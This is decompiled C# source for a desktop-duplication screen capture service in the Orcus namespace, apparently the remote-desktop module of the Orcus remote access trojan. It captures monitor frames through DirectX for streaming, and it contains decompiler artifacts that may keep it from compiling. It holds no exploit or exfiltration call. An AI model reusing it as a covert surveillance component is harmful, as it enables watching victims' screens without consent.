using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Orcus.Shared.Utilities.Compression;
using SharpDX;
using SharpDX.DXGI;
using SharpDX.Direct3D11;
using SharpDX.Mathematics.Interop;

namespace Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication;

public class DesktopDuplicationService : IDisposable, IScreenCaptureService
{
	private OutputDuplication _deskDupl;

	private Device _device;

	private OutputDescription _outputDesc;

	private Texture2DDescription _textureDesc;

	private Texture2D _desktopImageTexture;

	private OutputDuplicateFrameInformation _frameInfo;

	private int _currentMonitor;

	private ScreenHelper _screenHelper;

	public Guid Guid { get; set; } = Guid.NewGuid();


	public bool IsSupported
	{
		get
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			if (!IsWindows8OrNewer())
			{
				return false;
			}
			try
			{
				((DisposeBase)new Device((Adapter)(object)new Factory1().GetAdapter1(0))).Dispose();
				return true;
			}
			catch (SharpDXException)
			{
				return false;
			}
		}
	}

	public void Dispose()
	{
		Texture2D desktopImageTexture = _desktopImageTexture;
		if (desktopImageTexture != null)
		{
			((DisposeBase)desktopImageTexture).Dispose();
		}
		Device device = _device;
		if (device != null)
		{
			((DisposeBase)device).Dispose();
		}
		OutputDuplication deskDupl = _deskDupl;
		if (deskDupl != null)
		{
			((DisposeBase)deskDupl).Dispose();
		}
		_deskDupl = null;
		_device = null;
		_desktopImageTexture = null;
	}

	private bool IsWindows8OrNewer()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		if (oSVersion.Platform == PlatformID.Win32NT)
		{
			if (oSVersion.Version.Major <= 6)
			{
				if (oSVersion.Version.Major == 6)
				{
					return oSVersion.Version.Minor >= 2;
				}
				return false;
			}
			return true;
		}
		return false;
	}

	public void Initialize(int monitor)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		Adapter1 adapter;
		try
		{
			adapter = new Factory1().GetAdapter1(0);
		}
		catch (SharpDXException)
		{
			throw new DesktopDuplicationException("Could not find the specified graphics card adapter.");
		}
		Adapter1 val2 = adapter;
		Output output;
		try
		{
			_device = new Device((Adapter)(object)adapter);
			try
			{
				output = ((Adapter)adapter).GetOutput(monitor);
			}
			catch (SharpDXException)
			{
				throw new DesktopDuplicationException("Could not find the specified output device.");
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		Output val4 = output;
		try
		{
			Output1 val5 = ((ComObject)output).QueryInterface<Output1>();
			try
			{
				_outputDesc = output.get_Description();
				_textureDesc = new Texture2DDescription
				{
					CpuAccessFlags = (CpuAccessFlags)131072,
					BindFlags = (BindFlags)0,
					Format = (Format)87,
					Width = _outputDesc.DesktopBounds.GetWidth(),
					Height = _outputDesc.DesktopBounds.GetHeight(),
					OptionFlags = (ResourceOptionFlags)0,
					MipLevels = 1,
					ArraySize = 1,
					SampleDescription = 
					{
						Count = 1
					},
					SampleDescription = 
					{
						Quality = 0
					},
					Usage = (ResourceUsage)3
				};
				try
				{
					_deskDupl = val5.DuplicateOutput((ComObject)(object)_device);
				}
				catch (SharpDXException val6)
				{
					Result val7 = val6.get_ResultCode();
					int code = ((Result)(ref val7)).get_Code();
					val7 = ResultCode.NotCurrentlyAvailable.get_Result();
					if (code == ((Result)(ref val7)).get_Code())
					{
						throw new DesktopDuplicationException("There is already the maximum number of applications using the Desktop Duplication API running, please close one of the applications and try again.");
					}
				}
			}
			finally
			{
				((IDisposable)val5)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val4)?.Dispose();
		}
		_currentMonitor = monitor;
		_screenHelper = new ScreenHelper();
	}

	public void ChangeMonitor(int monitor)
	{
		Dispose();
		Initialize(monitor);
	}

	public Bitmap CaptureScreen()
	{
		if (!RetrieveFrame())
		{
			return null;
		}
		try
		{
			return GetFrameBitmap();
		}
		finally
		{
			ReleaseFrame();
		}
	}

	public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		if (!RetrieveFrame())
		{
			return null;
		}
		DataBox val = _device.get_ImmediateContext().MapSubresource((Resource)(object)_desktopImageTexture, 0, (MapMode)1, (MapFlags)0);
		try
		{
			if (updateCursor)
			{
				_screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);
			}
			if (_frameInfo.TotalMetadataBufferSize > 0)
			{
				OutputDuplicateMoveRectangle[] array = (OutputDuplicateMoveRectangle[])(object)new OutputDuplicateMoveRectangle[_frameInfo.TotalMetadataBufferSize];
				int num = default(int);
				_deskDupl.GetFrameMoveRects(array.Length, array, ref num);
				MovedRegion[] array2 = (MovedRegion[])(object)new MovedRegion[num / Marshal.SizeOf(typeof(OutputDuplicateMoveRectangle))];
				for (int i = 0; i < array2.Length; i++)
				{
					OutputDuplicateMoveRectangle val2 = array[i];
					int num2 = i;
					MovedRegion val3 = default(MovedRegion);
					((MovedRegion)(ref val3)).set_Source(new Point(val2.SourcePoint.X, val2.SourcePoint.Y));
					((MovedRegion)(ref val3)).set_Destination(new Rectangle(val2.DestinationRect.Left, val2.DestinationRect.Top, val2.DestinationRect.GetWidth(), val2.DestinationRect.GetHeight()));
					array2[num2] = val3;
				}
				RawRectangle[] array3 = (RawRectangle[])(object)new RawRectangle[_frameInfo.TotalMetadataBufferSize - num];
				int num3 = default(int);
				_deskDupl.GetFrameDirtyRects(array3.Length, array3, ref num3);
				Rectangle[] array4 = new Rectangle[num3 / Marshal.SizeOf(typeof(Rectangle))];
				for (int j = 0; j < array4.Length; j++)
				{
					RawRectangle val4 = array3[j];
					array4[j] = new Rectangle(val4.Left, val4.Top, val4.GetWidth(), val4.GetHeight());
				}
				return streamCodec.CodeImage(val.DataPointer, array4, array2, new Size(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()), (PixelFormat)2498570);
			}
			return streamCodec.CodeImage(val.DataPointer, new Rectangle(0, 0, _outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()), new Size(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()), (PixelFormat)2498570);
		}
		finally
		{
			_device.get_ImmediateContext().UnmapSubresource((Resource)(object)_desktopImageTexture, 0);
			ReleaseFrame();
		}
	}

	private bool RetrieveFrame()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		if (_desktopImageTexture == null)
		{
			_desktopImageTexture = new Texture2D(_device, _textureDesc);
		}
		Resource val = null;
		_frameInfo = default(OutputDuplicateFrameInformation);
		try
		{
			_deskDupl.AcquireNextFrame(500, ref _frameInfo, ref val);
		}
		catch (SharpDXException val2)
		{
			SharpDXException val3 = val2;
			Result val4 = val3.get_ResultCode();
			int code = ((Result)(ref val4)).get_Code();
			val4 = ResultCode.WaitTimeout.get_Result();
			if (code == ((Result)(ref val4)).get_Code())
			{
				return false;
			}
			val4 = val3.get_ResultCode();
			if (((Result)(ref val4)).get_Failure())
			{
				throw new DesktopDuplicationException("Failed to acquire next frame.");
			}
		}
		Texture2D val5 = ((ComObject)val).QueryInterface<Texture2D>();
		try
		{
			_device.get_ImmediateContext().CopyResource((Resource)(object)val5, (Resource)(object)_desktopImageTexture);
		}
		finally
		{
			((IDisposable)val5)?.Dispose();
		}
		((DisposeBase)val).Dispose();
		return true;
	}

	private Bitmap GetFrameBitmap()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		DataBox val = _device.get_ImmediateContext().MapSubresource((Resource)(object)_desktopImageTexture, 0, (MapMode)1, (MapFlags)0);
		Bitmap val2 = new Bitmap(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight(), (PixelFormat)137224);
		Rectangle rectangle = new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height());
		BitmapData val3 = val2.LockBits(rectangle, (ImageLockMode)2, ((Image)val2).get_PixelFormat());
		IntPtr intPtr = val.DataPointer;
		IntPtr intPtr2 = val3.get_Scan0();
		for (int i = 0; i < _outputDesc.DesktopBounds.GetHeight(); i++)
		{
			Utilities.CopyMemory(intPtr2, intPtr, _outputDesc.DesktopBounds.GetWidth() * 4);
			intPtr = intPtr.Add(val.RowPitch);
			intPtr2 = intPtr2.Add(val3.get_Stride());
		}
		val2.UnlockBits(val3);
		_device.get_ImmediateContext().UnmapSubresource((Resource)(object)_desktopImageTexture, 0);
		return val2;
	}

	private void ReleaseFrame()
	{
		//IL_000e: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			_deskDupl.ReleaseFrame();
		}
		catch (SharpDXException val)
		{
			SharpDXException val2 = val;
			Result resultCode = val2.get_ResultCode();
			if (((Result)(ref resultCode)).get_Failure())
			{
				throw val2;
			}
		}
	}
}
